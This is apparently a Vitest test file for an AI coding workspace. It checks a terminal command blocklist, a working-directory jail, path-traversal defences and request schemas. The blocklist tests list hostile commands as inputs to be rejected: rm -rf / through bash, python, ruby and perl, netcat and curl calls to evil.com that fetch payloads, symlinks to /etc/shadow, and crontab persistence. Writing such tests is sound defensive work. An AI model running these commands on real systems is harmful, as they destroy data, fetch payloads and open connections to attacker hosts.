import { describe, it, expect, vi } from "vitest";
import path from "node:path";

// Mock auth/db dependencies (same pattern as other unit tests)
vi.mock("@/auth", () => ({ auth: vi.fn() }));
vi.mock("@/lib/db", () => ({ prisma: {} }));

import { validateCommand, changeDir } from "@/lib/terminal/runner";
import { resolveSafe, normalizeRelPath, getProjectRoot } from "@/lib/storage";
import { ApiError } from "@/lib/api";
import {
  generateChangeSetSchema,
  applyChangeSetSchema,
  updateFileChangeSchema,
  createWorkspaceSchema,
  createProjectSchema,
} from "@/lib/validators";
import { createAgentRunSchema } from "@/lib/agents/schemas";

// ============================================================
// 1. Terminal CWD Jail Tests
// ============================================================
describe("terminal CWD jail", () => {
  const KEY = "testproj";

  describe("changeDir blocks escape attempts", () => {
    it("re-roots absolute paths inside project", () => {
      const result = changeDir(KEY, "", "/etc/passwd");
      expect(result).toBe("etc/passwd");
    });

    it("re-roots Windows drive paths inside project", () => {
      const result = changeDir(KEY, "", "C:\\Windows");
      expect(result).toBe("Windows");
    });

    it("blocks bare ..", () => {
      expect(() => changeDir(KEY, "", "..")).toThrow(ApiError);
    });

    it("blocks ../..", () => {
      expect(() => changeDir(KEY, "", "../..")).toThrow(ApiError);
    });

    it("blocks relative escape from subdir", () => {
      expect(() => changeDir(KEY, "src", "../../escape")).toThrow(ApiError);
    });

    it("blocks deeply nested traversal", () => {
      expect(() => changeDir(KEY, "a/b/c", "../../../../etc")).toThrow(ApiError);
    });
  });

  describe("changeDir allows valid navigation", () => {
    it("navigates to subdirectory", () => {
      expect(changeDir(KEY, "", "src")).toBe("src");
    });

    it("navigates deeper", () => {
      expect(changeDir(KEY, "src", "components")).toBe("src/components");
    });

    it("navigates up within project", () => {
      expect(changeDir(KEY, "src/components", "..")).toBe("src");
    });

    it("returns to root with ~ or empty", () => {
      expect(changeDir(KEY, "src/deep/path", "~")).toBe("");
    });

    it("handles quoted paths", () => {
      expect(changeDir(KEY, "", "\"src\"")).toBe("src");
      expect(changeDir(KEY, "", "'lib'")).toBe("lib");
    });
  });
});

// ============================================================
// 2. Terminal Blocklist - New Rules
// ============================================================
describe("terminal blocklist \u2014 new hardening rules", () => {
  describe("blocks symlink creation", () => {
    const symlinkCmds = [
      "ln -s /etc/passwd link",
      "ln --symbolic /tmp/evil ./escape",
      "ln -sf /etc/shadow shadow",
      "mklink /D link C:\\Windows",
      "mklink link target",
    ];
    for (const cmd of symlinkCmds) {
      it(`blocks: ${cmd}`, () => {
        const res = validateCommand(cmd);
        expect(res.ok).toBe(false);
        expect(res.reason).toContain("symlink");
      });
    }
  });

  describe("blocks shell -c invocation", () => {
    const shellCmds = [
      "bash -c 'rm -rf /'",
      "sh -c 'cat /etc/passwd'",
      "zsh -c 'evil command'",
      "cmd /c del /s C:\\",
    ];
    for (const cmd of shellCmds) {
      it(`blocks: ${cmd}`, () => {
        const res = validateCommand(cmd);
        expect(res.ok).toBe(false);
      });
    }
  });

  describe("blocks interpreter inline execution", () => {
    const interpreterCmds = [
      "python -c 'import os; os.system(\"rm -rf /\")'",
      "python3 -c 'print(\"evil\")'",
      "ruby -e 'system(\"rm -rf /\")'",
      "perl -e 'exec(\"rm -rf /\")'",
      "node -e 'require(\"child_process\").execSync(\"evil\")'",
      "node --eval 'process.exit(1)'",
    ];
    for (const cmd of interpreterCmds) {
      it(`blocks: ${cmd}`, () => {
        const res = validateCommand(cmd);
        expect(res.ok).toBe(false);
      });
    }
  });

  describe("blocks network exfiltration tools", () => {
    const netCmds = [
      "nc evil.com 4444",
      "ncat -l 8080",
      "netcat 10.0.0.1 9999",
      "socat TCP:evil.com:80 -",
      "curl http://evil.com -o /tmp/payload",
      "wget http://evil.com --output-document=payload",
      "curl https://api.com > output.txt",
    ];
    for (const cmd of netCmds) {
      it(`blocks: ${cmd}`, () => {
        const res = validateCommand(cmd);
        expect(res.ok).toBe(false);
      });
    }
  });

  describe("blocks scheduling/persistence", () => {
    const schedCmds = [
      "crontab -e",
      "crontab -l",
      "at now + 1 minute",
    ];
    for (const cmd of schedCmds) {
      it(`blocks: ${cmd}`, () => {
        const res = validateCommand(cmd);
        expect(res.ok).toBe(false);
      });
    }
  });

  describe("blocks backgrounding (& not &&)", () => {
    it("blocks: sleep 9999 &", () => {
      const res = validateCommand("sleep 9999 &");
      expect(res.ok).toBe(false);
    });

    it("blocks: cmd & echo done (mid-command &)", () => {
      const res = validateCommand("cmd & echo done");
      expect(res.ok).toBe(false);
    });

    it("allows: npm install && npm test (&& is logical AND)", () => {
      const res = validateCommand("npm install && npm test");
      expect(res.ok).toBe(true);
    });

    it("allows: echo foo || echo bar (|| is logical OR)", () => {
      const res = validateCommand("echo foo || echo bar");
      expect(res.ok).toBe(true);
    });
  });

  describe("still allows safe commands after hardening", () => {
    const safe = [
      "npm install",
      "npm run build",
      "git status",
      "git log --oneline",
      "ls -la",
      "cat src/index.ts",
      "echo hello",
      "mkdir -p src/components",
      "tsc --noEmit",
      "npx vitest run",
      "curl https://registry.npmjs.org/react",
    ];
    for (const cmd of safe) {
      it(`allows: ${cmd}`, () => {
        const res = validateCommand(cmd);
        expect(res.ok).toBe(true);
      });
    }
  });
});

// ============================================================
// 3. Path Traversal on Write (storage layer)
// ============================================================
describe("storage \u2014 write path traversal prevention", () => {
  const KEY = "writetest";

  describe("normalizeRelPath blocks all traversal on write targets", () => {
    const traversalAttacks = [
      "../../../etc/passwd",
      "..\\..\\windows\\system32\\config",
      "foo/../../.env",
      "src/../../../secret",
    ];
    for (const p of traversalAttacks) {
      it(`blocks write to "${p}"`, () => {
        expect(() => normalizeRelPath(p)).toThrow(ApiError);
      });
    }

    it("treats URL-encoded %2e%2e as a literal directory name (safe)", () => {
      // normalizeRelPath does NOT decode percent-encoding, so %2e%2e is treated
      // as a literal directory name � it does NOT become ".." and does NOT escape.
      const result = normalizeRelPath("%2e%2e/etc/passwd");
      expect(result).toBe("%2e%2e/etc/passwd");
    });
  });

  describe("resolveSafe containment on write targets", () => {
    it("write target stays inside project root", () => {
      const root = getProjectRoot(KEY);
      const abs = resolveSafe(KEY, "src/new-file.ts");
      expect(abs.startsWith(root)).toBe(true);
    });

    it("deeply nested write target stays inside project root", () => {
      const root = getProjectRoot(KEY);
      const abs = resolveSafe(KEY, "a/b/c/d/e/f/g.ts");
      expect(abs.startsWith(root)).toBe(true);
    });

    it("write to re-rooted absolute path stays inside project", () => {
      const root = getProjectRoot(KEY);
      const abs = resolveSafe(KEY, "/etc/passwd");
      const rootWithSep = root.endsWith(path.sep) ? root : root + path.sep;
      expect(abs === root || abs.startsWith(rootWithSep)).toBe(true);
    });
  });
});

// ============================================================
// 4. AI Changeset JSON Validation (schema tests)
// ============================================================
describe("AI changeset schema validation", () => {
  it("accepts valid input", () => {
    const result = generateChangeSetSchema.safeParse({
      projectId: "proj123",
      instruction: "Add a hello world function",
    });
    expect(result.success).toBe(true);
  });

  it("rejects missing projectId", () => {
    const result = generateChangeSetSchema.safeParse({
      instruction: "Do something",
    });
    expect(result.success).toBe(false);
  });

  it("rejects missing instruction", () => {
    const result = generateChangeSetSchema.safeParse({
      projectId: "proj123",
    });
    expect(result.success).toBe(false);
  });

  it("rejects empty instruction", () => {
    const result = generateChangeSetSchema.safeParse({
      projectId: "proj123",
      instruction: "",
    });
    expect(result.success).toBe(false);
  });

  it("accepts optional selectedPaths", () => {
    const result = generateChangeSetSchema.safeParse({
      projectId: "proj123",
      instruction: "Refactor the code",
      selectedPaths: ["src/index.ts", "src/lib/utils.ts"],
    });
    expect(result.success).toBe(true);
    expect(result.data!.selectedPaths).toEqual(["src/index.ts", "src/lib/utils.ts"]);
  });

  it("applyChangeSet defaults applyAll to false", () => {
    const result = applyChangeSetSchema.safeParse({});
    expect(result.success).toBe(true);
    expect(result.data!.applyAll).toBe(false);
  });

  it("applyChangeSet accepts applyAll: true", () => {
    const result = applyChangeSetSchema.safeParse({ applyAll: true });
    expect(result.success).toBe(true);
    expect(result.data!.applyAll).toBe(true);
  });

  it("updateFileChange accepts ACCEPTED", () => {
    const result = updateFileChangeSchema.safeParse({ status: "ACCEPTED" });
    expect(result.success).toBe(true);
  });

  it("updateFileChange accepts REJECTED", () => {
    const result = updateFileChangeSchema.safeParse({ status: "REJECTED" });
    expect(result.success).toBe(true);
  });

  it("updateFileChange rejects invalid status", () => {
    const result = updateFileChangeSchema.safeParse({ status: "APPLIED" });
    expect(result.success).toBe(false);
  });

  it("updateFileChange rejects PENDING (can't set back to pending)", () => {
    const result = updateFileChangeSchema.safeParse({ status: "PENDING" });
    expect(result.success).toBe(false);
  });
});

// ============================================================
// 5. Agent Waiting Approval Behavior (schema validation)
// ============================================================
describe("agent run schema validation", () => {
  it("accepts valid goal", () => {
    const result = createAgentRunSchema.safeParse({
      goal: "Implement a login page with email and password fields",
    });
    expect(result.success).toBe(true);
  });

  it("rejects goal shorter than 4 chars", () => {
    const result = createAgentRunSchema.safeParse({ goal: "hi" });
    expect(result.success).toBe(false);
  });

  it("rejects goal longer than 4000 chars", () => {
    const result = createAgentRunSchema.safeParse({ goal: "x".repeat(4001) });
    expect(result.success).toBe(false);
  });

  it("accepts optional threadId", () => {
    const result = createAgentRunSchema.safeParse({
      goal: "Refactor the authentication module",
      threadId: "thread_abc123",
    });
    expect(result.success).toBe(true);
    expect(result.data!.threadId).toBe("thread_abc123");
  });

  it("rejects empty threadId", () => {
    const result = createAgentRunSchema.safeParse({
      goal: "Some valid goal here",
      threadId: "",
    });
    expect(result.success).toBe(false);
  });
});

// ============================================================
// 6. Project Permission / Access Validation
// ============================================================
describe("project access validation schemas", () => {
  describe("createWorkspaceSchema", () => {
    it("accepts valid workspace name", () => {
      const result = createWorkspaceSchema.safeParse({ name: "My Workspace" });
      expect(result.success).toBe(true);
    });

    it("rejects empty name", () => {
      const result = createWorkspaceSchema.safeParse({ name: "" });
      expect(result.success).toBe(false);
    });

    it("rejects name over 100 chars", () => {
      const result = createWorkspaceSchema.safeParse({ name: "x".repeat(101) });
      expect(result.success).toBe(false);
    });

    it("trims whitespace", () => {
      const result = createWorkspaceSchema.safeParse({ name: "  My Workspace  " });
      expect(result.success).toBe(true);
      expect(result.data!.name).toBe("My Workspace");
    });
  });

  describe("createProjectSchema", () => {
    it("accepts valid project", () => {
      const result = createProjectSchema.safeParse({
        workspaceId: "ws_123",
        name: "My Project",
      });
      expect(result.success).toBe(true);
    });

    it("rejects missing workspaceId", () => {
      const result = createProjectSchema.safeParse({ name: "My Project" });
      expect(result.success).toBe(false);
    });

    it("rejects missing name", () => {
      const result = createProjectSchema.safeParse({ workspaceId: "ws_123" });
      expect(result.success).toBe(false);
    });

    it("defaults template to blank", () => {
      const result = createProjectSchema.safeParse({
        workspaceId: "ws_123",
        name: "My Project",
      });
      expect(result.success).toBe(true);
      expect(result.data!.template).toBe("blank");
    });

    it("accepts node template", () => {
      const result = createProjectSchema.safeParse({
        workspaceId: "ws_123",
        name: "My Project",
        template: "node",
      });
      expect(result.success).toBe(true);
      expect(result.data!.template).toBe("node");
    });

    it("rejects invalid template", () => {
      const result = createProjectSchema.safeParse({
        workspaceId: "ws_123",
        name: "My Project",
        template: "invalid",
      });
      expect(result.success).toBe(false);
    });
  });
});
